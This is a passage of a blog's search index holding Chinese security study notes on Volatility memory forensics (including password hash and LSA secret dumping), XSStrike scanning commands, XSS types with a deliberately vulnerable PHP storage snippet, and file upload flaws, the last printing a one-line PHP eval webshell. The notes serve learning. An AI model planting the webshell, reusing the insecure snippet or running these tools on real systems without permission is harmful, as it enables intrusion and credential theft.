<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内存取证第一天</title>
      <link href="/year/01/04/nei-cun-qu-zheng/"/>
      <url>/year/01/04/nei-cun-qu-zheng/</url>
      
        <content type="html"><![CDATA[<h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>内存取证 (Memory forensics) 是一种从内存中找到和抽取这些有价值的信息的方式。</p><p> 由于要比赛，我负责第二阶段的数字取证，于是我开始学习内存取证，我其实也不懂这个方面的东西，b站也没找到相关的学习<br> 资料，只能开始网上找资料再自己进行笼统性的学习一下，内存取证的专门工具Volatility，win和liu系统都有</p><h3 id="Volatility"><a href="#Volatility" class="headerlink" title="Volatility"></a>Volatility</h3><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h4 id="常见windows工具进程名"><a href="#常见windows工具进程名" class="headerlink" title="常见windows工具进程名"></a>常见windows工具进程名</h4><p>TrueCrypt.exe 磁盘加密工具<br>notepad.exe 自带记事本<br>mspaint.exe 自带画图工具<br>iexplore.exe IE浏览器<br>DumpIt.exe 内存镜像提取工具</p><h4 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证"></a>内存取证</h4><p>取证文件后缀 .raw、.vmem、.img<br>常用命令(imageinfo，pslist，dumpfiles，memdump)<br>可疑的进程（notepad，cmd）<br>和磁盘取证结合起来考察<br>了解部分操作系统原理<br>常见文件后缀dmg，img</p><h4 id="Volatility支持的插件命令"><a href="#Volatility支持的插件命令" class="headerlink" title="Volatility支持的插件命令"></a>Volatility支持的插件命令</h4><blockquote><p>amcache        查看AmCache应用程序痕迹信息<br>        apihooks       检测内核及进程的内存空间中的API hook<br>        atoms          列出会话及窗口站atom表<br>        atomscan       Atom表的池扫描(Pool scanner)<br>        auditpol       列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息<br>        bigpools       使用BigPagePoolScanner转储大分页池(big page pools)<br>        bioskbd        从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)<br>        cachedump      获取内存中缓存的域帐号的密码哈希<br>        callbacks      打印全系统通知例程<br>        clipboard      提取Windows剪贴板中的内容<br>        cmdline        显示进程命令行参数<br>        cmdscan        提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）<br>        connections    打印系统打开的网络连接(仅支持Windows XP 和2003)<br>        connscan       打印TCP连接信息<br>        consoles       提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）<br>        crashinfo      提取崩溃转储信息<br>        deskscan       tagDESKTOP池扫描(Poolscaner)<br>        devicetree     显示设备树信息<br>        dlldump        从进程地址空间转储动态链接库<br>        dlllist        打印每个进程加载的动态链接库列表<br>        driverirp      IRP hook驱动检测<br>        drivermodule   关联驱动对象至内核模块<br>        driverscan     驱动对象池扫描<br>        dumpcerts      提取RAS私钥及SSL公钥<br>        dumpfiles      提取内存中映射或缓存的文件<br>        dumpregistry   转储内存中注册表信息至磁盘<br>        editbox        查看Edit编辑控件信息 (Listbox正在实验中)<br>        envars         显示进程的环境变量<br>        eventhooks     打印Windows事件hook详细信息<br>        evtlogs        提取Windows事件日志（仅支持XP/2003)<br>        filescan       提取文件对象（file objects）池信息<br>        gahti          转储用户句柄（handle）类型信息<br>        gditimers      打印已安装的GDI计时器(timers)及回调(callbacks)<br>        gdt            显示全局描述符表(Global Deor Table)<br>        getservicesids 获取注册表中的服务名称并返回SID信息<br>        getsids        打印每个进程的SID信息<br>        handles        打印每个进程打开的句柄的列表<br>        hashdump       转储内存中的Windows帐户密码哈希(LM/NTLM)<br>        hibinfo        转储休眠文件信息<br>        hivedump       打印注册表配置单元信息<br>        hivelist       打印注册表配置单元列表<br>        hivescan       注册表配置单元池扫描<br>        hpakextract    从HPAK文件（Fast Dump格式）提取物理内存数据<br>        hpakinfo       查看HPAK文件属性及相关信息<br>        idt            显示中断描述符表(Interrupt Deor Table)<br>        iehistory      重建IE缓存及访问历史记录<br>        imagecopy      将物理地址空间导出原生DD镜像文件<br>        imageinfo      查看/识别镜像信息<br>        impscan        扫描对导入函数的调用<br>        joblinks       打印进程任务链接信息<br>        kdbgscan       搜索和转储潜在KDBG值<br>        kpcrscan       搜索和转储潜在KPCR值<br>        ldrmodules     检测未链接的动态链接DLL<br>        lsadump        从注册表中提取LSA密钥信息（已解密）<br>        machoinfo      转储Mach-O 文件格式信息<br>        malfind        查找隐藏的和插入的代码<br>        mbrparser      扫描并解析潜在的主引导记录(MBR)<br>        memdump        转储进程的可寻址内存<br>        memmap         打印内存映射<br>        messagehooks   桌面和窗口消息钩子的线程列表<br>        mftparser      扫描并解析潜在的MFT条目<br>        moddump        转储内核驱动程序到可执行文件的示例<br>        modscan        内核模块池扫描<br>        modules        打印加载模块的列表<br>        multiscan      批量扫描各种对象<br>        mutantscan     对互斥对象池扫描<br>        notepad        查看记事本当前显示的文本<br>        objtypescan    扫描窗口对象类型对象<br>        patcher        基于页面扫描的补丁程序内存<br>        poolpeek       可配置的池扫描器插件<br>        printkey       打印注册表项及其子项和值<br>        privs          显示进程权限<br>        procdump       进程转储到一个可执行文件示例<br>        pslist         按照EPROCESS列表打印所有正在运行的进程<br>        psscan         进程对象池扫描<br>        pstree         以树型方式打印进程列表<br>        psxview        查找带有隐藏进程的所有进程列表<br>        qemuinfo       转储 Qemu 信息<br>        raw2dmp        将物理内存原生数据转换为windbg崩溃转储格式<br>        screenshot     基于GDI Windows的虚拟屏幕截图保存<br>        servicediff    Windows服务列表(ala Plugx)<br>        sessions       _MM_SESSION_SPACE的详细信息列表(用户登录会话)<br>        shellbags      打印Shellbags信息<br>        shimcache      解析应用程序兼容性Shim缓存注册表项<br>        shutdowntime   从内存中的注册表信息获取机器关机时间<br>        sockets        打印已打开套接字列表<br>        sockscan       TCP套接字对象池扫描<br>        ssdt           显示SSDT条目<br>        strings        物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)<br>        svcscan        Windows服务列表扫描<br>        symlinkscan    符号链接对象池扫描<br>        thrdscan       线程对象池扫描<br>        threads        调查_ETHREAD 和_KTHREADs<br>        timeliner      创建内存中的各种痕迹信息的时间线<br>        timers         打印内核计时器及关联模块的DPC<br>        truecryptmasterRecover 恢复TrueCrypt 7.1a主密钥<br>        truecryptpassphrase查找并提取TrueCrypt密码<br>        truecryptsummaryTrueCrypt摘要信息<br>        unloadedmodules打印卸载的模块信息列表<br>        userassist     打印注册表中UserAssist相关信息<br>        userhandles    转储用户句柄表<br>        vaddump        转储VAD数据为文件<br>        vadinfo        转储VAD信息<br>        vadtree        以树形方式显示VAD树信息<br>        vadwalk        显示遍历VAD树<br>        vboxinfo       转储Virtualbox信息（虚拟机）<br>        verinfo        打印PE镜像中的版本信息<br>        vmwareinfo     转储VMware VMSS/VMSN 信息<br>        volshell       内存镜像中的shell<br>        windows        打印桌面窗口(详细信息)<br>        wintree        Z顺序打印桌面窗口树<br>        wndscan        池扫描窗口站<br>        yarascan       以Yara签名扫描进程或内核内存</p></blockquote><h4 id="使用（个人见解）"><a href="#使用（个人见解）" class="headerlink" title="使用（个人见解）"></a>使用（个人见解）</h4><h5 id="识别内存文件信息"><a href="#识别内存文件信息" class="headerlink" title="识别内存文件信息"></a>识别内存文件信息</h5><blockquote><p>$ volatility -f mem.dump imageinfo</p></blockquote><p>显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数</p><p><img src="/img/14.png" title="Magic Gardens"></p><p>这边我们看到他的信息为Win7SP1x64</p><h5 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h5><blockquote><p>$ volatility -f mem.dump –profile=Win7SP1x64 pslist</p></blockquote><p><img src="/img/20.png" title="Magic Gardens"><br>查看进程信息<br>熟悉常见进程，查看启动时间，大小等信息</p><h3 id="volatility实例"><a href="#volatility实例" class="headerlink" title="volatility实例"></a>volatility实例</h3><p>任务描述：某日你获取了一个内存文件，请分析文件完成以下任务。</p><h4 id="任务（一）-获取admin用户密码是多少-？"><a href="#任务（一）-获取admin用户密码是多少-？" class="headerlink" title="任务（一） 获取admin用户密码是多少 ？"></a>任务（一） 获取admin用户密码是多少 ？</h4><p>先通过imageinfo获取系统信息<br><img src="/img/61.png" title="Magic Gardens"></p><p>使用hashdump获取sam<br><img src="/img/62.png" title="Magic Gardens"></p><p>可以通过john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看<br><img src="/img/63.png" title="Magic Gardens"></p><h4 id="任务（二）-获ip和主机名是什么？"><a href="#任务（二）-获ip和主机名是什么？" class="headerlink" title="任务（二） 获ip和主机名是什么？"></a>任务（二） 获ip和主机名是什么？</h4><p>通过netscan可以查询到地址<br><img src="/img/64.png" title="Magic Gardens"></p><p>主机名需要通过查询注册表，先用hivelist<br><img src="/img/65.png" title="Magic Gardens"><br>通过hivedump查询对应键名volatility -f worldskills3.vmem –profile=Win7SP1x64 hivedump -o 0xfffff8a000024010 &gt; system.txt;cat system.txt|grep name，这个速度比较慢。<br><img src="/img/66.png" title="Magic Gardens"></p><p>如果知道键名的话，可以直接查询键值<br><img src="/img/67.png" title="Magic Gardens"></p>]]></content>
      
      
      <categories>
          
          <category> 数字取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsstrike工具的使用</title>
      <link href="/year/12/28/xsstrike-gong-ju-de-shi-yong/"/>
      <url>/year/12/28/xsstrike-gong-ju-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h3 id="关于XSStrike"><a href="#关于XSStrike" class="headerlink" title="关于XSStrike"></a>关于XSStrike</h3><p>XSStrike是一款用于探测并利用XSS漏洞的脚本<br>它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p><hr><p>下面是xsstrike的下载链接</p><blockquote><p><a href="https://github.com/s0md3v/XSStrike">XSS的github项目</a></p></blockquote><blockquote><p><a href="https://pan.baidu.com/s/1y50VYVRGnRumg7CP1qqdRA?pwd=ooen">百度网盘链接 密码ooen</a></p></blockquote><h4 id="XSStrike的特点"><a href="#XSStrike的特点" class="headerlink" title="XSStrike的特点"></a>XSStrike的特点</h4><p>对参数进行模糊测试之后构建合适的payload</p><p>使用payload对参数进行穷举匹配</p><p>内置爬虫功能</p><p>检测并尝试绕过WAF</p><p>支持GET及POST方式</p><p>误报率极低</p><h3 id="XSStrike的使用"><a href="#XSStrike的使用" class="headerlink" title="XSStrike的使用"></a>XSStrike的使用</h3><p><strong>绵酱这边提现你：XSStrike只可以运行在python 3.6 及以上版本！！！！！！</strong></p><p>下载完后解压，复制XSStrike.py的文件路径在cmd窗口中运行</p><p>更新依赖 &nbsp;在xsstrike目录中</p><blockquote><p>pip3 install -r requirements.txt<br>运行<br>python3 xsstrike.py -u “<a href="http://target/">http://target</a>“</p></blockquote><p>测试GET传参的网页：</p><blockquote><p>python3 xsstrike.py -u “<a href="http://xxxxxxxx.com/xss.php?payload=1">http://xxxxxxxx.com/xss.php?payload=1</a>“</p></blockquote><p>测试POST数据：</p><blockquote><p>python3 xsstrike.py -u “<a href="http://xxxxx.com/search.php">http://xxxxx.com/search.php</a>“ –data “q=query”<br>python3 xsstrike.py -u “<a href="http://xxxxxx.com/search.php">http://xxxxxx.com/search.php</a>“ –data ‘{“q”:”query”} –json’</p></blockquote><p>通过解析HTML和暴力破解来查找隐藏的参数</p><blockquote><p>python3 xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –params</p></blockquote><p>盲打XSS：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码<br>在爬取时使用此选项，XSStrike注入定义在core/config.py中的盲注payloads到每个HTML表单的每个参数。<br>core/config.py中的payloads</p><blockquote><p>python3 xsstrike.py -u <a href="http://example.com/page.php?q=query">http://example.com/page.php?q=query</a> –crawl –blind</p></blockquote><p><img src="/img/11.png" title="我也没看懂"></p><p>这种情况我我也不清楚，这就是gitub第一xss注入神器吗</p><p>模糊测试 –fuzzer<br>该模糊器旨在测试过滤器和Web应用程序防火墙，可使用-d选项将延迟设置为1秒。不然可能被waf软件拉黑ip</p><blockquote><p>python3 xsstrike.py -u “<a href="http://example.com/search.php?q=query">http://example.com/search.php?q=query</a>“ –fuzzer</p></blockquote><p>跳过Dom扫描<br>选项：–skip-dom</p><p>如果确定了不是dom型，为了节省时间，可以跳过dom扫描。</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php?q=query">http://example.com/search.php?q=query</a>“ –skip-dom</p></blockquote><h3 id="各参数的说明"><a href="#各参数的说明" class="headerlink" title="各参数的说明"></a>各参数的说明</h3><blockquote><p>选项作用</p><blockquote><p>-h, –help显示帮助信息并退出<br> -u, –url  目标url<br>–data post方法的数据<br>-f, –file  从文件读取payloads<br>-t, –threads 线程数量<br>-l, –level  爬取级别<br> -t, –encode  payload采取的编码<br> –json  json格式的数据<br>–path指定路径注入<br>–seeds从文件加载url<br>–fuzzer fuzz工具<br> –update     更新<br>–timeout  超时时间<br>–params寻找参数<br> –crawl 爬取<br>–proxy    使用代理<br> –blind  爬取时盲注<br>–skip    跳过确认等<br> –skip-dom  跳过dom检查<br> –headers 添加headers<br>  -d, –delay    两次请求之间的延迟</p></blockquote></blockquote><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p> &nbsp;有好几次自己搭建的环境 ，安装了waf，xsstrike好几次都测不出来，cookie也没返回给我。<br> &nbsp;可能是我没有看官方文档吧0.0。工具使用主要因为我们人变化，可能我测试的地方出现问题<br> &nbsp;<br> &nbsp;使用工具没有错，虽然被叫做脚本小子，但是工具让我们的测试变得更加方便，我们会使用工具的同时也要去了解其工作原理 &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站之原理分类及攻击手法</title>
      <link href="/year/12/27/xss-kua-zhan-zhi-yuan-li-fen-lei-ji-gong-ji-shou-fa/"/>
      <url>/year/12/27/xss-kua-zhan-zhi-yuan-li-fen-lei-ji-gong-ji-shou-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="Xss跨站攻击的原理"><a href="#Xss跨站攻击的原理" class="headerlink" title="Xss跨站攻击的原理"></a>Xss跨站攻击的原理</h2><p>  XSS 属于被动式的攻击。攻击者先构造一个跨站页面，利用script、、等各种方式使得用户浏览这个页面时，触发对被攻击站点的http 请求。此时，如果被攻击者如果已经在被攻击站点登录，就会持有该站点cookie。这样该站点会认为被攻击者发起了一个http 请求。而实际上这个请求是在被攻击者不知情的情况下发起的，由此攻击者在一定程度上达到了冒充被攻击者的目的。精心的构造这个攻击请求，可以达到冒充发文，夺取权限等等多个攻击目的。在常见的攻击实例中，这个请求是通过script 来发起的，因此被称为Cross Site Script。攻击Yahoo Mail 的Yamanner 蠕虫是一个著名的XSS 攻击实例。YahooMail 系统有一个漏洞，当用户在web 上察看信件时，有可能执行到信件内的javascript 代码。病毒可以利用这个漏洞使被攻击用户运行病毒的script。同时Yahoo Mail 系统使用了Ajax技术，这样病毒的script可以很容易的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送病毒给他人。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p> &nbsp; &nbsp;<br>都是通过js脚本来实现的浏览器内核版本也会影响到js代码的实现</p><p>1、钓鱼欺骗</p><p>2、网站挂马</p><p>3、身份盗用</p><p>4、盗取网站用户信息</p><p>5、垃圾信息发送</p><p>6、劫持用户Web行为</p><p>7、XSS蠕虫</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型(非持久型)，存储型(持久型)，DOM型</p><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>反射型攻击方式就是把可以执行的 js脚本放到URL参数里面。存储型的攻击方式通过评论的这种方式，加载评论的时候把它写入到评论里面，它被后台存储之后，用户再打开的时候就会执行评论里面的脚本，这种必须时间很短，攻击是不持续的</p><h4 id="储存型（持久型）"><a href="#储存型（持久型）" class="headerlink" title="储存型（持久型）"></a>储存型（持久型）</h4><p>持久型/存储型XSS:嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户，<br>存储型：用户输入的数据会被存入数据库，然后页面输出时会被当做前端代码执行。</p><p>如果用户输入的数据不被存入数据库可以做到存储性xss吗?<br>答案是可以的，存储型XSS的核心是存入到某个地方然后调用，不一定就要存在数据库里，还可以是文件里。</p><blockquote><p>&lt;?php<br>if (@$_GET [‘a’]) {<br>file_put_contents ( ‘8.txt’,$_GET[‘a’] ); }<br>else{<br>echo file_get_contents ( ‘8.txt’ );<br>}<br>?&gt;</p></blockquote><p>file_put_contents()函数把一个字符串写入文件中。<br>file_get_contents()函数就是读取文件。<br>这段PHP代码的意思就是把GET传参a写入8.txt这个文件，然后读取出来<br>所以我们输入的东西会被存储到里面，第二次访问的时候会被读取出来，这里就构成了一个完整的存储，所以说数据库不是刚需。</p><blockquote><p>发包X=123 =&gt; x.php =&gt;写到数据库=&gt; x.php=&gt;回显</p><blockquote><p>评论框中输入script 代码, 一段未经转义过的 JS 代码被插入到页面之后，其他用户浏览的时候也会去执行它。如果是黑客它插一段JS代码，把用户cookie的值发送到指定的服务器上，这样他就能拿到用户的cookie值想干嘛就可以干嘛。我们知道HTTP协议它是没有状态，所以很多网站是通过Cookie去识别用户的，一旦黑客获取到你这个cookie就相当于拥有了你的账户就可以随便使用你这个账号了。这是个什么类型的 xss? 这个是把提交的脚本插入到数据库里面，所以这个是存储型的攻击方式。</p></blockquote></blockquote><blockquote><p>发包X=123 =&gt; x.php =&gt;回包</p><blockquote><p>有一些后端它是通过URL参数来去获取的，有时候会把脚本放入URL参数里面如：<a href="http://test.com/xss/example.php?name=%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E6%96%B9%E5%BC%8F%E5%8F%91%E9%80%81%E7%BB%99%E7%94%A8%E6%88%B7%EF%BC%8C%E8%AF%B1%E5%AF%BC%E7%94%A8%E6%88%B7%E5%8E%BB%E7%82%B9%E5%87%BB,%E8%BF%99%E5%B0%B1%E6%98%AF%E9%9D%9E%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F%E7%9A%84">http://test.com/xss/example.php?name=，然后通过邮件方式发送给用户，诱导用户去点击,这就是非存储形式的</a> XSS</p></blockquote></blockquote><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM型涉及到HTML DOM树，我相信学习HTML的同学不会觉得陌生<br><img src="/img/07.jpg" title="DOM树"></p><blockquote><p>Document 根节点（有些文档说Document是根节点，也有些文档说 html元素是 根节点。从对象的角度上来看，Document是根对象，从元素的角度上看，html元素由于父元素是null，所以是根元素）；<br>html 元素，html元素的父元素为null，所以从元素的角度来说是树的根；<br>head 元素 和 body 元素 都是 html 根元素的子元素。所以树对象（节点）可以具有子对象（子节点）；<br>href属性 是 a 元素的子对象（子节点），所以DOM树包含属性对象（属性节点）；<br>text文本 是 title元素 的子对象（子节点），所以DOM树包含文本对象（文本节点）；<br>a元素 的 父对象 是 body元素，body元素的 父对象 是 html元素，所以html元素 是 a元素的祖先对象（祖先节点）；<br>a元素 和 h1元素 都是 body元素的子对象（子节点），所以 a元素 和 h1元素是兄弟对象（兄弟节点）；<br>不懂想要了解的朋友可以去仔细学习一下</p></blockquote><p>DOM型是直接调用前段静态代码#’onclick=”alcrt(2)”&gt;我们可以在数据包中看到这些数据的交互，</p><h4 id="三者的区别"><a href="#三者的区别" class="headerlink" title="三者的区别"></a>三者的区别</h4><blockquote><p>反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的QQ号，那么攻击者就可以将一个含有反射型XSS的URL链接给A，此时我们可以看出，需要将特定的URL，注意是特定的URL给A，当A点击进入链接时，就受到XSS攻击，所以这种攻击范围不是特别的广。</p></blockquote><blockquote><p>而存储型XSS是广撒网的方式或者指定的方式，就是攻击者将存储型XSS放在一些有XSS漏洞的网站上，只要有用户访问这个链接就会中招，而攻击者也可以寻找被攻击对象，比如说上面的例子，所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。</p></blockquote><blockquote><p>DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</p></blockquote><h3 id="cookie和Session"><a href="#cookie和Session" class="headerlink" title="cookie和Session"></a>cookie和Session</h3><p> 1.Cookie 和 Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。Cookie 一般用来保存用户信息 比如</p><p> 2.我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你填写登录的一些基本信息；一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；</p><p>3.登录一次网站后访问网站其他页面不需要重新登录。Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的Session 之后就可以标识这个用户并且跟踪这个用户了。Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。Cookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果使用 Cookie的一些敏感信息不要写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。</p><p><strong>session存在的时间很短 ，一般我们都是获取cookie，但是有些大型网站会采取双验证，当然，我要是能获取到别人cookie我已经很开心了</strong></p><h4 id="cookie原理"><a href="#cookie原理" class="headerlink" title="cookie原理"></a>cookie原理</h4><p>当你在浏览网站的时候，WEB 服务器会先送一小小资料放在你的计算机上，Cookie 会帮你在网站上所打的文字或是一些选择，都纪录下来。当下次你再光临同一个网站，WEB 服务器会先看看有没有它上次留下的 Cookie 资料，有的话，就会依据 Cookie里的内容来判断使用者，送出特定的网页内容给你。</p><h4 id="session原理"><a href="#session原理" class="headerlink" title="session原理"></a>session原理</h4><blockquote><p>cookie保存session的id：保存这个session id的方式可以采用cookie，一般这个cookie的名字都是类似于SEEESIONID。<br>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。</p></blockquote><p>  当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识</p><p>（称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来</p><p>使用（检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相</p><p>关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应</p><p>中返回给客户端保存。保存这个session id的方式可以采用cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给</p><p>服务器。一般这个cookie的名字都是类似于SEEESIONID。但cookie可以被人为的禁止，则必须有其他机制以便在cookie被禁止时</p><p>仍然能够把session id传递回服务器。</p><h4 id="cookie-和session-的区别："><a href="#cookie-和session-的区别：" class="headerlink" title="cookie 和session 的区别："></a>cookie 和session 的区别：</h4><p>1、cookie数据存放在客户的浏览器上，session数据放在服务器上。</p><p>2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗<br>   考虑到安全应当使用session。</p><p>3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能<br>   考虑到减轻服务器性能方面，应当使用COOKIE。</p><p>4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p><p>5、所以个人建议：<br>   将登陆信息等重要信息存放为SESSION<br>   其他信息如果需要保留，可以放在COOKIE中</p>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> Xss跨站漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞浅谈</title>
      <link href="/year/12/26/wen-jian-shang-chuan-lou-dong-qian-tan/"/>
      <url>/year/12/26/wen-jian-shang-chuan-lou-dong-qian-tan/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a><font size="8px" color="bule">文件上传漏洞</font></h2><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。<br>那webshell又是什么呢？</p><blockquote><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。<br>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。<!--?php eval($_POST[a]); ?-->就是一个最常见最原始的小马。</p></blockquote><h3 id="文件上传漏洞如何查找及判断"><a href="#文件上传漏洞如何查找及判断" class="headerlink" title="文件上传漏洞如何查找及判断?"></a><span>文件上传漏洞如何查找及判断?</span></h3><p> 黑盒：使用扫描工具扫描打开网站。<br> 黑盒：测试会员中心，测试后台。<br> 白盒：直接撸源代码。</p><h3 id="文件上传漏洞有哪些需要注意的地方"><a href="#文件上传漏洞有哪些需要注意的地方" class="headerlink" title="文件上传漏洞有哪些需要注意的地方?"></a><span>文件上传漏洞有哪些需要注意的地方?</span></h3><p> 拿到漏洞后要对漏洞类型进行区分，编辑器、第三方应用、常规等。<br> 区分漏洞类型</p><h3 id="关于文件上传漏洞在实际应用中的说明"><a href="#关于文件上传漏洞在实际应用中的说明" class="headerlink" title="关于文件上传漏洞在实际应用中的说明"></a><span>关于文件上传漏洞在实际应用中的说明</span></h3><p>上传后门脚本获取网站权限。</p><p>常规文件上传地址的获取说明：上传的文件要执行的话，要按照对应代码执行。<br>不同格式下的文件类型后门测试<br>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞=高危漏洞。<br>上传漏洞靶场环境搭建<br>测试某CMS及CVE编号文件上传漏洞测试：这种第三方插件的漏洞测试和常规漏洞测试是不一样的。</p><hr><h2 id="上传漏洞和解析漏洞"><a href="#上传漏洞和解析漏洞" class="headerlink" title="上传漏洞和解析漏洞"></a><span>上传漏洞和解析漏洞</span></h2><p>文件上传漏洞和解析漏洞经常结合完成攻击，尤其当服务器端使用了白名单进行过滤时。此时构成的危害非常的大</p><h3 id="1-IIS5和IIS6解析漏洞"><a href="#1-IIS5和IIS6解析漏洞" class="headerlink" title="1.IIS5和IIS6解析漏洞"></a><span>1.IIS5和IIS6解析漏洞</span></h3><blockquote><p>在IIS6版本中，当攻击者访问http：//<a 